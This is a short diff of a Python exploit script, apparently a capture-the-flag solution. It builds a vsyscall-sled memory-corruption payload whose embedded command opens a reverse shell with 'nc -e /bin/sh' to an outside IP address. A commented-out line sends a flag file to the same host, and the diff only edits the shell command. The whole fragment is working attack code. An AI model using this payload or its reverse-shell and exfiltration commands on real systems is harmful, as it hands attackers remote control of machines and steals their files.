@@ -43,7 +43,7 @@ if __name__ == "__main__":
     '''
     vsyscall = 0xffffffffff600000
     #  cmd = "cat flag| nc 123.207.141.87 9999 ;"
-    cmd = ">&2 <&2 nc -e /bin/sh 123.207.141.87 9999;"
+    cmd = "nc -e /bin/sh 123.207.141.87 9999;"
     payload = '\0' * (0x7f + 0x10) + cmd 
     payload = payload.ljust(0xE0 + 8, '\0') + p64(vsyscall) * 20 + '\x3a'
 
